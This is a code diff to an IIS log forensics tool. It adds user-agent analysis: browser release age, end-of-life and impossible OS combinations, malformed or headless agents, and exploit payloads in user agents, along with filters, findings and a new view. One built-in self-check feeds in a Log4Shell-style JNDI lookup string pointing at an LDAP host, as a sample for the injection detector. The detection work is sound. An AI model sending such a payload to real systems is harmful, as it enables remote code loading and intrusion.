+    if (o.engine && o.major >= 0) { o.rel = UA.release(o.engine, o.major); }
+    if (o.engine) { o.bEol = eolOf(o.engine, o.major); }
+    // combinations that never existed
+    if (nt >= 0 && !o.stat.impossible) {
+      var who = o.name;
+      if (o.engine === 'chrome') {
+        if (nt < 5.1) { o.stat.impossible = who + ' on ' + o.os + ': Chromium browsers never ran on Windows 2000 or older'; }
+        else if (between(nt, 5.1, 6.0) && o.major > 49) { o.stat.impossible = who + ' on ' + o.os + ': version 49 was the last for Windows XP and Vista'; }
+        else if (between(nt, 6.1, 6.3) && o.major > 109) { o.stat.impossible = who + ' on ' + o.os + ': version 109 was the last for Windows 7, 8 and 8.1'; }
+      } else if (o.engine === 'firefox') {
+        if (nt < 5.1 && o.major > 12) { o.stat.impossible = who + ' on ' + o.os + ': Firefox 12 was the last for Windows 2000'; }
+        else if (between(nt, 5.1, 6.0) && o.major > 52) { o.stat.impossible = who + ' on ' + o.os + ': Firefox 52 ESR was the last for Windows XP and Vista'; }
+        else if (between(nt, 6.1, 6.3) && o.major > 115) { o.stat.impossible = who + ' on ' + o.os + ': Firefox 115 ESR was the last for Windows 7, 8 and 8.1'; }
+      } else if (o.engine === 'ie') {
+        var maxIe = nt < 5.1 ? 6 : nt < 6 ? 8 : nt < 6.1 ? 9 : 11, minIe = nt >= 6.3 ? 11 : nt >= 6.2 ? 10 : nt >= 6.1 ? 8 : nt >= 6.0 ? 7 : 0;
+        if (msieOnly && nt >= 6.1) { o.stat.impossible = 'MSIE ' + ieReal + ' on ' + o.os + ' without a Trident token: Internet Explorer on Windows 7 and later always sends one'; }
+        else if (ieReal > maxIe) { o.stat.impossible = who + ' on ' + o.os + ': Internet Explorer ' + maxIe + ' was the last for that Windows version'; }
+        else if (ieReal < minIe) { o.stat.impossible = who + ' on ' + o.os + ': that Windows version shipped with Internet Explorer ' + minIe; }
+      } else if (o.engine === 'edgehtml' && ntv !== '10.0') { o.stat.impossible = who + ' on ' + o.os + ': EdgeHTML Edge ran only on Windows 10'; }
+      else if (o.engine === 'safari' && o.major > 5) { o.stat.impossible = who + ' on ' + o.os + ': Safari for Windows ended with 5.1'; }
+    }
+    // malformed strings
+    var mz = RX.mozilla.exec(dec), bad = [];
+    if (RX.ctrl.test(dec)) { bad.push('control characters'); }
+    if (!parenOk(dec)) { bad.push('unbalanced brackets'); }
+    if (RX.mozTypo.test(dec)) { bad.push('misspelt Mozilla token'); }
+    else if (mz && mz[1] !== '4.0' && mz[1] !== '5.0') { bad.push('Mozilla/' + mz[1] + ' token (browsers send 4.0 or 5.0)'); }
+    if (RX.mozParen.test(dec)) { bad.push('no space after the Mozilla token'); }
+    if (dec.length > 768) { bad.push('unusually long (' + dec.length + ' characters)'); }
+    if (o.stat.malformed) { bad.push(o.stat.malformed); }
+    if (bad.length) { o.stat.malformed = bad.join('; '); } else { delete o.stat.malformed; }
+    if (P.RE.uaInject.test(dec)) { o.stat.inject = 'exploit payload in the user agent'; }
+    if (RX.headless.test(dec)) { o.stat.headless = 'headless browser or automation tool'; }
+    return o;
+  }
+
+  /* ---------- evaluation at a point in time ---------- */
+  UA.fmtDate = function (ms) { return U.dayKey(ms); };
+  /* Age of the browser version in days at time ts (null when unknown); negative ages (pre-release builds) are reported as 0. */
+  UA.ageAt = function (info, ts) {
+    if (!info.rel || !ts) { return null; }
+    return Math.max(0, Math.floor((ts - info.rel.ms) / DAY));
+  };
+  /* Flags of a user agent for a request at ts: { age, flags: [names], why: {flag: reason} }. rare is not included
+   * (it depends on the corpus): see UA.isRare. */
+  UA.at = function (info, ts) {
+    var out = { age: null, flags: [], why: {} }, k;
+    function add(f, why) { if (!out.why[f]) { out.flags.push(f); out.why[f] = why; } }
+    if (info.rel && ts) {
+      var raw = Math.floor((ts - info.rel.ms) / DAY), rd = (info.rel.est === 2 ? '~' : '') + UA.fmtDate(info.rel.ms);
+      out.age = Math.max(0, raw);
+      if (raw < -UA.cfg.futureDays) { add('impossible', info.name + ' was not released until ' + rd + ', ' + U.fmtNum(-raw) + ' days after ' + UA.fmtDate(ts)); }
+      else if (raw > UA.cfg.staleDays) { add('stale', info.name + ' was released ' + rd + ', ' + U.fmtNum(raw) + ' days before ' + UA.fmtDate(ts)); }
+    }
+    if (info.bEol && ts >= info.bEol) { add('eol', info.name + ': support ended ' + UA.fmtDate(info.bEol)); }
+    if (info.osEol && ts >= info.osEol) { add('eol-os', info.os + ': support ended ' + UA.fmtDate(info.osEol)); }
+    for (k in info.stat) { if (Object.prototype.hasOwnProperty.call(info.stat, k)) { add(k, info.stat[k]); } }
+    out.flags.sort(function (a, b) { return UA.FLAGS.indexOf(a) - UA.FLAGS.indexOf(b); });
+    return out;
+  };
+  /* UA.at for a row filter: every date in the tables is a UTC midnight and ages are whole days, so the result is the same
+   * for every request of a UTC day; it is kept on the deriver's per-string object for the last day asked. */
+  UA.atDay = function (ui, ts) {
+    var d = Math.floor(ts / DAY);
+    if (ui && ui.atD === d && ui.atG === UA.gen) { return ui.atR; }
+    var r = UA.at(UA.of(ui), d * DAY);
+    if (ui) { ui.atD = d; ui.atG = UA.gen; ui.atR = r; }
+    return r;
+  };
+  /* rec: an index user-agent record ({ipN, ipOv, pubN}) or a loaded-rows group. Rare: no more than cfg.rareIps clients, at
+   * least one of them public (internal-only clients such as health checks are not interesting). A user agent missing from
+   * the index was evicted because it was rarely seen, so it counts as rare. */
+  UA.isRare = function (rec) { return !rec || (!rec.ipOv && rec.ipN <= UA.cfg.rareIps && rec.pubN > 0); };
+  /* The deriver's per-string object (store.uaInfo, ev.ctx.ui) gets its analysis attached once. */
+  UA.of = function (ui) { return ui ? (ui.px || (ui.px = UA.info(ui.dec))) : UA.info(''); };
+  /* Index keys are the raw logged strings (spaces logged as '+'). */
+  UA.decodeKey = function (k) { return k === '-' ? '' : k.replace(/\+/g, ' '); };
 }(IISLA));
 
 </script>
@@ -4266,6 +4698,7 @@ var IISLA = IISLA || {};
       return (c.pub && p._st[c.r.status] === 1) || (p._w32[c.r.win32] === 1 && c.r.method === 'POST' && c.si.exec);
     },
     'R-WS-004': function (c) { return c.si.shellName || c.qi.shellParam || c.ui.shellUa; },
+    'R-UA-003': function (c) { return c.ui.inject; },
     'R-WS-005': function (c) {
       return c.si.ws005 && c.pub && c.r.status === 200 && (c.r.method === 'POST' || (!c.qi.empty && !c.qi.versionOnly));
     },
@@ -4381,7 +4814,7 @@ var IISLA = IISLA || {};
   'use strict';
   var U = NS.util, IO = NS.io, P = NS.parser, R = NS.rules, S = NS.scan = {};
 
-  S.SCHEMA = 7; // 7: outcome-graded severities, response mix per rule; 4: ASCII-only JSON; 5: windows-1252 + UTF-8 recovery, DST zones; 6: strict dates, resume state, rule-set fingerprint incl. enabled rules
+  S.SCHEMA = 8; // 8: per-user-agent status mix, executable successes, rule-hit rows, public clients and first occurrence; 7: outcome-graded severities, response mix per rule; 4: ASCII-only JSON; 5: windows-1252 + UTF-8 recovery, DST zones; 6: strict dates, resume state, rule-set fingerprint incl. enabled rules
   S.IP_STEM_CAP = 32;   // distinct paths tracked per client (count continues as overflow)
   S.IP_UA_CAP = 8;      // distinct user agents tracked per client
   S.WIN_PURGE_ROWS = 400000; // purge idle per-client windows this often
@@ -4687,11 +5120,16 @@ var IISLA = IISLA || {};
     var u = idx.uas[r.ua];
     if (!u) {
       if (this.counts.uas >= idx.caps.uaCap && this.counts.uas >= this.evictAt.uas) { this.evictUas(); }
-      u = idx.uas[r.ua] = { n: 0, first: t, last: t, ips: U.newMap(), ipN: 0, ipOv: 0, fam: ui.fam };
+      u = idx.uas[r.ua] = { n: 0, first: t, last: t, fFile: r.fileId, fLine: r.lineNo, fIp: U.own(ip), ips: U.newMap(), ipN: 0, ipOv: 0, pubN: 0, fam: ui.fam,
+        s2: 0, s3: 0, s4: 0, s5: 0, post: 0, exec: 0, xok: 0, hits: 0 };
       this.counts.uas++;
     }
-    u.n++; if (t > u.last) { u.last = t; } if (t < u.first) { u.first = t; }
-    if (u.ips[ip] === undefined) { if (u.ipN < 20) { u.ips[ip] = 1; u.ipN++; } else { u.ipOv = 1; } }
+    u.n++; if (t > u.last) { u.last = t; } if (t < u.first) { u.first = t; u.fFile = r.fileId; u.fLine = r.lineNo; u.fIp = U.own(ip); }
+    if (u.ips[ip] === undefined) { if (u.ipN < 20) { u.ips[ip] = 1; u.ipN++; if (pub) { u.pubN++; } } else { u.ipOv = 1; } }
+    if (scl === 2) { u.s2++; } else if (scl === 3) { u.s3++; } else if (scl === 4) { u.s4++; } else if (scl === 5) { u.s5++; }
+    if (isPost) { u.post++; }
+    if (si.exec) { u.exec++; if (scl === 2 && pub) { u.xok++; } } // xok: public 2xx responses from executable handlers
+    if (nh) { u.hits++; }
 
     // ---- users ----
     if (r.user !== '-' && r.user !== '') {
@@ -4787,7 +5225,7 @@ var IISLA = IISLA || {};
   S.Scanner.prototype.evictUas = function () {
     var ua = this.idx.uas, k, removed = 0, thr = 1;
     while (this.counts.uas >= this.idx.caps.uaCap * 0.9 && thr < 1000) {
-      for (k in ua) { if (ua[k].n <= thr) { delete ua[k]; this.counts.uas--; removed++; } }
+      for (k in ua) { if (ua[k].n <= thr && !ua[k].hits) { delete ua[k]; this.counts.uas--; removed++; } } // user agents with rule hits are kept
       thr *= 2;
     }
     this.idx.caps.uaEvicted += removed;
@@ -4969,9 +5407,41 @@ var IISLA = IISLA || {};
         f.firstRef = [s.fFile, s.fLine]; out.push(f);
       }
     }
+    // --- user-agent rules (classified by lib/useragent.js from the string and the time it was first seen) ---
+    S.uaFindings(idx, out, en, pr);
     // --- integrity ---
     S.integrityFindings(idx, rs, out, en, pr);
     return R.sortFindings(S.groupFindings(out, rs));
+  };
+
+  /* R-UA-001 (outdated browser reaching executable handlers) and R-UA-002 (spoofed, malformed or automation user agent). */
+  S.uaFindings = function (idx, out, en, pr) {
+    var UAx = NS.useragent, r1 = en('R-UA-001'), r2 = en('R-UA-002'), k, f;
+    if (!UAx || (!r1 && !r2)) { return; }
+    var minAge = pr('R-UA-001', 'minAgeDays', 730), inclEol = pr('R-UA-001', 'includeEol', true) !== false, minOk = pr('R-UA-001', 'minExecOk', 1), maxIps = pr('R-UA-001', 'maxIps', 20);
+    var want = {}, esc2 = pr('R-UA-002', 'escalateOnExecOk', true) !== false;
+    pr('R-UA-002', 'flags', ['impossible', 'malformed', 'headless']).forEach(function (x) { want[x] = 1; });
+    for (k in idx.uas) {
+      var u = idx.uas[k], dec = UAx.decodeKey(k), inf = UAx.info(dec);
+      if (!dec) { continue; }
+      var at = UAx.at(inf, u.first), ips = [], x, clients = u.ipN + (u.ipOv ? '+' : '') + ' client(s)';
+      for (x in u.ips) { ips.push(x); }
+      if (r1 && inf.engine && (u.xok || 0) >= minOk && !u.ipOv && u.ipN <= maxIps && ((at.age !== null && at.age >= minAge) || (inclEol && at.why.eol))) {
+        f = R.newFinding(r1, 'ua', dec); f.count = u.n; f.first = u.first; f.last = u.last; f.ips = ips; f.firstRef = [u.fFile, u.fLine];
+        f.detail = (at.age !== null ? inf.name + ' was released ' + (inf.rel.est === 2 ? '~' : '') + UAx.fmtDate(inf.rel.ms) + ', ' + U.fmtNum(at.age) + ' days before it was first seen' : inf.name) +
+          (at.why.eol ? '; ' + at.why.eol : '') + (at.why['eol-os'] ? '; ' + at.why['eol-os'] : '') + '. ' + U.fmtNum(u.xok) + ' public 2xx responses from executable handlers; ' + clients + ', ' + U.fmtNum(u.n) + ' requests.';
+        out.push(f);
+      }
+      if (r2 && u.pubN > 0) {
+        var hit = at.flags.filter(function (fl) { return want[fl] === 1; });
+        if (hit.length) {
+          f = R.newFinding(r2, 'ua', dec, esc2 && u.xok > 0 ? 'medium' : null); f.count = u.n; f.first = u.first; f.last = u.last; f.ips = ips; f.firstRef = [u.fFile, u.fLine];
+          f.detail = hit.map(function (fl) { return fl + ': ' + at.why[fl]; }).join('; ') + '. ' + clients + ' (' + u.pubN + ' public), ' + U.fmtNum(u.n) + ' requests, ' +
+            U.fmtNum(u.xok) + ' public 2xx responses from executable handlers.';
+          out.push(f);
+        }
+      }
+    }
   };
 
   /* Keeps the S.GROUP_AT strongest findings per rule (by severity, then count) and folds the rest into one summary finding. */
@@ -5392,6 +5862,9 @@ var IISLA = IISLA || {};
     { key: 'ua', label: 'User agent', w: 260, get: function (s, i) { var u = s.uaInfo[s.ua[i]]; return u ? u.dec : ''; }, sort: 'ua', tab: 'ua' },
     { key: 'uaRaw', label: 'User agent (raw)', w: 260, get: sv('ua', 'ua'), sort: 'ua', tab: 'ua', hidden: true },
     { key: 'fam', label: 'UA family', w: 80, get: function (s, i) { var u = s.uaInfo[s.ua[i]]; return u ? u.fam : ''; } },
+    { key: 'uaBrowser', label: 'Browser / OS', w: 170, hidden: true, get: function (s, i) { var x = NS.useragent.of(s.uaInfo[s.ua[i]]); return x.name + (x.name && x.os ? ' / ' : '') + x.os; } },
+    { key: 'uaAge', label: 'UA age (days)', w: 70, num: true, hidden: true, get: function (s, i) { var a = NS.useragent.ageAt(NS.useragent.of(s.uaInfo[s.ua[i]]), s.ts[i]); return a === null ? '' : '' + a; } },
+    { key: 'uaFlags', label: 'UA flags', w: 150, hidden: true, get: function (s, i) { return NS.useragent.atDay(s.uaInfo[s.ua[i]], s.ts[i]).flags.join(','); } },
     { key: 'user', label: 'Username', w: 90, get: sv('user', 'user'), sort: 'user', tab: 'user', hidden: true },
     { key: 'ref', label: 'Referer', w: 200, get: sv('ref', 'ref'), sort: 'ref', tab: 'ref', hidden: true },
     { key: 'host', label: 'Host', w: 120, get: sv('host', 'host'), sort: 'host', tab: 'host', hidden: true },
@@ -5771,6 +6244,23 @@ var IISLA = IISLA || {};
           t = memo(strTester(op, v)); fn = function (A) { return t(A.ui().dec); };
         }
         break;
+      case 'uax': // parsed user agent (lib/useragent.js), judged at the time of the request
+        var UAm = NS.useragent;
+        if (op === 'flag') {
+          var want = setOf(v), any = want.any === 1, rare = want.rare === 1, idxU = env.index ? env.index.uas : null;
+          fn = function (A) {
+            var x = UAm.atDay(A.ui(), A.ts()), j;
+            for (j = 0; j < x.flags.length; j++) { if (any || want[x.flags[j]] === 1) { return true; } }
+            return rare && idxU ? !A.ui().empty && UAm.isRare(idxU[A.ua()]) : false;
+          };
+        } else if (op === 'age') {
+          var lo = v[0], hi = v[1];
+          fn = function (A) { var a = UAm.atDay(A.ui(), A.ts()).age; return a !== null && a >= lo && a <= hi; };
+        } else if (op === 'browser') {
+          var bs = setOf(v);
+          fn = function (A) { return bs[UAm.of(A.ui()).browser] === 1; };
+        }
+        break;
       case 'user':
         if (op === 'present') { fn = function (A) { var u = A.user(); return u !== '-' && u !== ''; }; } else { t = memo(strTester(op, v)); fn = function (A) { return t(A.user()); }; }
         break;
@@ -5873,7 +6363,8 @@ var IISLA = IISLA || {};
     ['stem:login  stem:*.aspx  stem:=/exact  stem:^/portal  stem:/regex/', 'URI stem: contains, glob, exact, starts with, regex'],
     ['ext:.aspx,.php  dir:/uploads/  exec:yes  static:no  new:2026-09-01', 'extension, directory prefix, executable/static flags, stem first seen on/after date'],
     ['query:cmd=  query:/regex/  qlen:>500  decerr:yes', 'query contains / regex / length / decode errors'],
-    ['ua:python  family:scanner  ua:empty', 'user agent contains / family / empty'],
+    ['ua:python  ua:="exact string"  family:scanner  ua:empty', 'user agent contains / exact / family / empty'],
+    ['uaflag:stale,impossible  uaflag:any  uaage:>365  browser:ie,firefox', 'user-agent flags at the time of the request (stale eol eol-os impossible malformed inject headless rare, or any), browser version age in days, parsed browser'],
     ['user:any  user:admin', 'username present / contains'],
     ['taken:>1000  bytes:>1000000', 'time-taken ms / sc-bytes'],
     ['after:2026-09-10  before:"2026-09-11 12:00"  hour:0-6  dow:0,6', 'time range in display TZ (append Z for UTC), local hour and weekday'],
@@ -5883,12 +6374,24 @@ var IISLA = IISLA || {};
     ['-field:value', 'prefix any term with - to negate it; bare words must all appear in stem or query']
   ];
 
+  /* field:value, field:"quoted value", field:="exact quoted" and field:^"quoted prefix" (the = / ^ may also sit inside the quotes) */
   function tokenize(s) {
-    var out = [], re = /(-?)([A-Za-z]+):("(?:[^"]*)"|\S+)|"([^"]*)"|(\S+)/g, m;
+    var out = [], re = /(-?)([A-Za-z]+):([=^]?"(?:[^"]*)"|\S+)|"([^"]*)"|(\S+)/g, m, v, pre;
     while ((m = re.exec(s))) {
-      if (m[2]) { out.push({ neg: m[1] === '-', field: m[2].toLowerCase(), value: m[3].charAt(0) === '"' ? m[3].slice(1, -1) : m[3], text: m[0] }); } else { out.push({ neg: false, field: '', value: m[4] !== undefined ? m[4] : m[5], text: m[0] }); }
+      if (m[2]) {
+        v = m[3]; pre = v.charAt(0) === '=' || v.charAt(0) === '^' ? v.charAt(0) : '';
+        if (v.charAt(pre.length) === '"' && v.length >= pre.length + 2 && v.charAt(v.length - 1) === '"') { v = pre + v.slice(pre.length + 1, -1); }
+        out.push({ neg: m[1] === '-', field: m[2].toLowerCase(), value: v, text: m[0] });
+      } else { out.push({ neg: false, field: '', value: m[4] !== undefined ? m[4] : m[5], text: m[0] }); }
     }
     return out;
+  }
+  /* uaage values: >N >=N <N <=N N-M N (days) */
+  function rangeOf(v, text) {
+    var m = /^(<=?|>=?)?(\d+)$/.exec(v), r;
+    if (m) { var n = +m[2], BIG = 1e9; r = !m[1] ? [n, n] : m[1] === '>' ? [n + 1, BIG] : m[1] === '>=' ? [n, BIG] : m[1] === '<' ? [-BIG, n - 1] : [-BIG, n]; return r; } // finite: the model survives JSON
+    if ((m = /^(\d+)-(\d+)$/.exec(v))) { return [+m[1], +m[2]]; }
+    throw new Error('Expected a number of days (>365, <=30, 100-200) in ' + text);
   }
   function yes(v) { return /^(yes|y|true|1|on)$/i.test(v); }
   function splitList(v) { return v.split(',').filter(function (x) { return x !== ''; }); }
@@ -5915,6 +6418,13 @@ var IISLA = IISLA || {};
       }
       else if (f === 'ua') { c = { f: 'ua', op: 'empty' }; }
       else if (f === 'family') { c = { f: 'ua', op: 'family', v: splitList(v) }; }
+      else if (f === 'uaflag') {
+        var fl = splitList(v.toLowerCase());
+        fl.forEach(function (x) { if (x !== 'any' && NS.useragent.FLAGS.indexOf(x) < 0) { throw new Error('Unknown user-agent flag "' + x + '" in ' + t.text + ' (' + NS.useragent.FLAGS.join(', ') + ', any)'); } });
+        c = { f: 'uax', op: 'flag', v: fl };
+      }
+      else if (f === 'uaage') { c = { f: 'uax', op: 'age', v: rangeOf(v, t.text) }; }
+      else if (f === 'browser') { c = { f: 'uax', op: 'browser', v: splitList(v.toLowerCase()) }; }
       else if (f === 'ext') { c = { f: 'stem', op: 'ext', v: splitList(v) }; }
       else if (f === 'dir') { c = { f: 'stem', op: 'dir', v: splitList(v) }; }
       else if (f === 'exec') { c = { f: 'stem', op: 'exec', neg: !yes(v) }; }
@@ -5971,6 +6481,8 @@ var IISLA = IISLA || {};
     { name: 'Any rule hit', q: 'rule:any' },
     { name: 'High / critical rule hits', q: 'sev:high,critical' },
     { name: 'Scanner and library user agents', q: 'family:scanner,library,empty' },
+    { name: 'Outdated or spoofed user agents', q: 'uaflag:stale,eol,eol-os,impossible,malformed,headless' },
+    { name: 'Exploit payloads in the user agent', q: 'uaflag:inject' },
     { name: 'External 200 responses', q: 'class:public status:200' },
     { name: 'Request filtering blocks (404.x)', q: 'status:404.7,404.8,404.11,404.12,404.13,404.14,404.15,404.18,404.19' },
     { name: 'Slow requests (> 30 s)', q: 'taken:>30000' },
@@ -6651,7 +7163,7 @@ var IISLA = IISLA || {};
   C.loadLists = function () {
     var names = ['sensitive-paths', 'scanner-user-agents', 'executable-extensions', 'static-extensions', 'static-abuse-extensions', 'probe-extensions',
       'login-endpoints', 'known-exploit-paths', 'upload-directories', 'download-endpoints', 'public-download-directories', 'exfil-extensions',
-      'exfil-high-extensions', 'webshell-names', 'webshell-parameters', 'dotnet-probe-paths'], out = {}, i, t;
+      'exfil-high-extensions', 'webshell-names', 'webshell-parameters', 'dotnet-probe-paths', 'browser-releases'], out = {}, i, t;
     for (i = 0; i < names.length; i++) {
       t = IO.resource('lists/' + names[i] + '.txt');
       if (t !== null) { out[names[i]] = U.parseList(t); }
@@ -7534,6 +8046,8 @@ var IISLA = IISLA || {};
     UI.applyScale(UI.dpiScale() * (args.zoom || st.settings.uiZoom || 1));
     A.applyBitness();
     st.lists = C.loadLists();
+    NS.useragent.init(st.lists['browser-releases']);
+    NS.useragent.configure(st.settings);
     A.loadRules();
     A.applyNetworkLists();
     if (st.settings.geoCsv) { try { NS.enrich.load(st.settings.geoCsv); } catch (e) { NS.enrich.error = e.message; } if (NS.enrich.error) { NS.bootWarnings.push(NS.enrich.error); } }
@@ -7676,7 +8190,7 @@ var IISLA = IISLA || {};
   /* ---------- layout ---------- */
   A.NAV = [
     ['home', 'Case & evidence'], ['overview', 'Overview'], ['findings', 'Findings'], ['grid', 'Rows (grid)'], ['topn', 'Top-N'], ['timeline', 'Timeline'],
-    ['ips', 'Client IPs'], ['uris', 'URI stems'], ['sessions', 'Sessions'], ['integrity', 'Integrity'], ['iocs', 'IOCs'], ['logparser', 'Log Parser'], ['tags', 'Tags & notes'],
+    ['ips', 'Client IPs'], ['uris', 'URI stems'], ['uas', 'User agents'], ['sessions', 'Sessions'], ['integrity', 'Integrity'], ['iocs', 'IOCs'], ['logparser', 'Log Parser'], ['tags', 'Tags & notes'],
     ['settings', 'Settings'], ['help', 'Help']
   ];
   A.layout = function () {
@@ -7788,7 +8302,7 @@ var IISLA = IISLA || {};
     st.idx = null; st.idxPath = null; st.scope = null; st.store = null; st.loadInfo = null; st.sessions = null; st.sessionsMs = 0;
     st.grid = { model: { conds: [] }, view: null, sortKey: 'ts', sortDesc: false, sel: -1, first: 0, text: '' };
     st.gridCtl = null; st.lpResult = null; st.iocHits = null; st.topnLast = null; st.findFilter = null; st.viewParam = null;
-    st.ipCfg = null; st.uriCfg = null; st.tlCfg = null; st.topnCfg = null; st.sesCfg = null;
+    st.ipCfg = null; st.uriCfg = null; st.tlCfg = null; st.topnCfg = null; st.sesCfg = null; st.uaCfg = null; st.uaLast = null;
   };
   /* Everything that belongs to the open case: the evidence selection plus all site state. */
   A.resetCaseState = function () {
@@ -8235,7 +8749,7 @@ var IISLA = IISLA || {};
     function shots(cb) {
       var topIp = '', fi; // the client of the most severe client finding
       for (fi = 0; st.idx && fi < st.idx.findings.length && !topIp; fi++) { if (st.idx.findings[fi].entity === 'ip') { topIp = st.idx.findings[fi].key; } }
-      var seq = [['overview'], ['findings'], ['grid'], ['ipProfile', args.shotip || topIp || '203.0.113.45'], ['topn'], ['timeline'], ['uris'], ['sessions'], ['integrity'], ['logparser'], ['iocs'], ['home'], ['help']], k = 0;
+      var seq = [['overview'], ['findings'], ['grid'], ['ipProfile', args.shotip || topIp || '203.0.113.45'], ['topn'], ['timeline'], ['uris'], ['uas'], ['sessions'], ['integrity'], ['logparser'], ['iocs'], ['home'], ['help']], k = 0;
       function next() {
         if (k >= seq.length) { cb(); return; }
         var s = seq[k++];
@@ -8311,10 +8825,28 @@ var IISLA = IISLA || {};
             }, true);
             return;
           }
-          var views = ['overview', 'findings', 'topn', 'timeline', 'ips', 'uris', 'integrity', 'iocs', 'logparser', 'tags', 'settings', 'help', 'home'];
+          var views = ['overview', 'findings', 'topn', 'timeline', 'ips', 'uris', 'uas', 'integrity', 'iocs', 'logparser', 'tags', 'settings', 'help', 'home'];
           if (st.store) { views.splice(2, 0, 'grid', 'sessions'); }
           var v;
           for (v = 0; v < views.length; v++) { var tv = Date.now(); A.nav(views[v]); step('view.' + views[v], { ms: Date.now() - tv, nodes: st.el.main.getElementsByTagName('*').length }); }
+          // user agents: parser and flags in this script engine, the exact-match pivot filter, the loaded-rows scope of the view
+          try {
+            var UAx = NS.useragent, uat = Date.UTC(2026, 2, 10), uaS = function (s) { var x = UAx.at(UAx.info(s), uat); return UAx.info(s).name + '|' + x.flags.join(','); };
+            var uaSamples = { win7chrome114: uaS('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'),
+              ie6xp: uaS('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'), ie11: uaS('Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'),
+              jndi: uaS('${jndi:ldap://198.51.100.200:1389/Exploit}'), headless: uaS('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.0.0 Safari/537.36') };
+            var uaDec = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36', uaCond = F.parse(NS.views.uaFilter(uaDec), 0).conds[0];
+            var uaStep = { loaded: UAx.loaded, samples: uaSamples, pivotOp: uaCond.op, pivotExact: uaCond.v[0] === uaDec };
+            if (st.store) {
+              A.setGridFilterText('uaflag:any'); uaStep.gridAnyFlag = st.grid.view.length;
+              A.setGridFilterText('uaage:>365'); uaStep.gridAgeOver365 = st.grid.view.length;
+              var firstUa = st.store.uaInfo[st.store.ua[0]].dec; A.setGridFilterText(NS.views.uaFilter(firstUa)); uaStep.gridPivotRows = st.grid.view.length;
+              A.setGridFilterText(''); st.uaCfg = { scope: 'loaded', show: 'all', q: '' }; A.nav('uas'); uaStep.loadedViewNodes = st.el.main.getElementsByTagName('*').length; st.uaCfg = null;
+            }
+            uaStep.ok = UAx.loaded && uaSamples.win7chrome114 === 'Chrome 114|stale,eol-os,impossible' && uaSamples.ie6xp === 'Internet Explorer 6|stale,eol,eol-os' && uaSamples.ie11 === 'Internet Explorer 11|stale,eol' &&
+              uaSamples.jndi === '|inject' && uaSamples.headless === 'Headless Chrome 139|headless' && uaStep.pivotExact && (!st.store || uaStep.gridPivotRows > 0);
+            step('ua.checks', uaStep);
+          } catch (eU) { res.errors.push('ua.checks: ' + eU.message); }
           // dialogs: open and close each one to catch rendering errors
           var dlgs = [['scan', NS.views.scanDialog], ['load', NS.views.loadDialog], ['export', NS.views.exportDialog]], di;
           for (di = 0; di < dlgs.length; di++) {
@@ -8652,6 +9184,7 @@ var IISLA = IISLA || {};
         done(null, X.table(['Session', 'IP', 'Class', 'UA family', 'User agent', 'Start UTC', 'End UTC', 'Duration s', 'Rows', 'Distinct stems', '2xx', '3xx', '4xx', '5xx', 'Exec POST', 'Rule-hit rows'], rows, X.outPath('sessions', 'csv'), 'sessions'));
       }]);
     }
+    if (st.uaLast) { items.push(['User agents \u2192 CSV', st.uaLast.rows.length + ' rows: ' + st.uaLast.title + ', with parsed browser, age, flags and reasons', function () { done(null, X.table(st.uaLast.headers, st.uaLast.rows, X.outPath('user-agents', 'csv'), 'user-agents', { title: st.uaLast.title })); }]); }
     if (st.topnLast) { items.push(['Top-N table \u2192 CSV', st.topnLast.title, function () { done(null, X.table(st.topnLast.headers, st.topnLast.rows, X.outPath('topn', 'csv'), 'topn', { title: st.topnLast.title })); }]); }
     if (st.lpResult) {
       items.push(['Log Parser result \u2192 CSV', U.fmtNum(st.lpResult.rows.length) + ' rows from the last Log Parser query', function () {
@@ -8824,6 +9357,7 @@ var IISLA = IISLA || {};
         UI.btn('Load evidence rows', function () { V.loadForFinding(f); }, 'primary'),
         f.ips && f.ips.length === 1 ? UI.btn('IP profile', function () { A.nav('ipProfile', f.ips[0]); }) : null,
         f.entity === 'stem' ? UI.btn('URI profile', function () { A.nav('uriProfile', f.key); }) : null,
+        f.entity === 'ua' ? UI.btn('User agent details', function () { A.nav('uas', f.key); }) : null,
         f.firstRef ? UI.btn('Raw context of first occurrence', function () { A.rawContext(f.firstRef[0], f.firstRef[1]); }) : null,
         f.fileRefs && f.fileRefs.length ? UI.btn('Raw context', function () { A.rawContext(f.fileRefs[0][0], f.fileRefs[0][1]); }) : null,
         h('span', { className: 'sp' }), UI.field('Disposition', dsel), note,
@@ -8863,6 +9397,8 @@ var IISLA = IISLA || {};
     } else if (f.entity === 'stem') {
       var s = idx.stems[f.key], ids2 = s ? A.fileIdsForRange(s.first, s.last) : A.allFileIds();
       A.load({ fileIds: ids2, preModel: { conds: [{ f: 'stem', op: 'eq', v: [f.key], text: 'stem:=' + f.key }] }, label: f.id + ' ' + f.ruleId });
+    } else if (f.entity === 'ua') {
+      A.load({ fileIds: A.fileIdsForRange(f.first, f.last), preText: V.uaFilter(f.key), label: f.id + ' ' + f.ruleId });
     } else if (f.entity === 'summary') {
       var mem = f.members || [], fids = [], j;
       for (j = 0; j < idx.files.length; j++) { if (mem.indexOf(idx.files[j].name) >= 0) { fids.push(j); } }
@@ -9015,16 +9551,18 @@ var IISLA = IISLA || {};
       { label: 'Stem ' + (si.dec.length > 50 ? si.dec.substr(0, 50) + '\u2026' : si.dec), onClick: function () { add('stem:=' + q(A2.stem())); } },
       { label: 'Status ' + stc, onClick: function () { add('status:' + stc); } },
       { label: 'UA family ' + ua.fam, onClick: function () { add('family:' + ua.fam); } },
-      { label: 'Same user agent', onClick: function () { add('ua:=' + q(ua.dec)); } },
+      { label: 'Same user agent', onClick: function () { add(V.uaFilter(ua.dec)); } },
       { label: 'Hour ' + hr + ' (local)', onClick: function () { add('hour:' + hr); } },
       { label: '\u00b15 minutes around this row', onClick: function () { V.aroundRow(i, 5); } },
       { header: 'Exclude' },
       { label: 'Exclude client ' + ip, onClick: function () { add('-cip:' + ip); } },
       { label: 'Exclude this stem', onClick: function () { add('-stem:=' + q(A2.stem())); } },
       { label: 'Exclude status ' + stc, onClick: function () { add('-status:' + stc); } },
+      { label: 'Exclude this user agent', onClick: function () { add('-' + V.uaFilter(ua.dec)); } },
       { sep: true },
